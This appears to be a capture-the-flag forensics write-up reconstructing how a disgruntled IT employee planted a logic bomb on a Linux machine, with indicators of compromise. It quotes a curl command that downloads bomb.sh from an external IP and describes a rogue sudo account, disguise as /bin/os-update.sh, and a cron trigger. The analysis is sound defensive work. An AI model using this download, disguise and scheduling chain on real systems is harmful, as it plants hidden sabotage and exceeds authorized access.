# Disgruntled

**Category:** Endpoint Forensics (Linux) / Insider Threat
**Tools:** Linux log analysis (`.bash\_history`, `auth.log`, `/etc/sudoers`, `.viminfo`, cron)
**Skills demonstrated:** Linux intrusion reconstruction, insider-threat analysis, privilege-abuse tracing, scheduled-task (logic bomb) identification



## Scenario

A disgruntled IT employee last worked on this machine. They were supposed to only
install a service — the task is to review the machine for anything the client should
be worried about, starting from the privileged commands that were run.



## Investigation

**1. Privileged commands.** Reviewing the commands run with elevated privileges, the
IT user installed **dokuwiki** (an open-source wiki that stores data in plain text
files rather than an SQL database):

```
/usr/bin/apt install dokuwiki
```

run from the working directory `/home/cybert`. This was the *authorized* task.

**2. Unauthorized account creation.** After the install, a new user **`it-admin`**
was created — unrelated to the service the employee was supposed to set up.

**3. Privilege escalation.** `it-admin` was then granted **sudo** privileges; the
`/etc/sudoers` file was updated at **Dec 28 06:27:34**.

**4. Malicious script retrieval.** A script file, `bomb.sh`, was opened in **vi**.
Reviewing the command history, the file had been downloaded from an external server
with curl:

```
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

**5. Disguise.** Via the vi/editor history, the attacker **renamed and relocated** the
file to blend in as a legitimate system script:

```
/bin/os-update.sh   (last modified Dec 28 06:29)
```

**6. The payload / trigger.** Inspecting the file's contents and the machine's
scheduled tasks (cron), the script is set to execute and create a file named
**`goodbye.txt`**. The scheduled trigger fires at **08:00 AM**.



## Attack Chain

```
apt install dokuwiki  (authorized task, /home/cybert)
   → useradd it-admin  (unauthorized account)
   → it-admin granted sudo  (/etc/sudoers updated Dec 28 06:27:34)
   → curl 10.10.158.38:8080/bomb.sh  (malicious script pulled from external host)
   → renamed/moved to /bin/os-update.sh  (disguised as a system script)
   → scheduled via cron to execute at 08:00 AM, creating goodbye.txt
```



## Indicators of Compromise

|Type|Value|
|-|-|
|Authorized install|apt install dokuwiki|
|Unauthorized account|it-admin|
|Sudoers modified|Dec 28 06:27:34|
|Malicious script source|http://10.10.158.38:8080/bomb.sh|
|Disguised script path|/bin/os-update.sh (original bomb.sh)|
|Payload output|goodbye.txt|
|Trigger|cron, 08:00 AM|



## Summary

A disgruntled IT employee, under cover of an authorized dokuwiki install, created a
rogue `it-admin` account, granted it sudo, and planted a **logic bomb**: a script
(`bomb.sh`) pulled from an external host, renamed to `/bin/os-update.sh` to look
legitimate, and scheduled via cron to detonate at 08:00 AM.

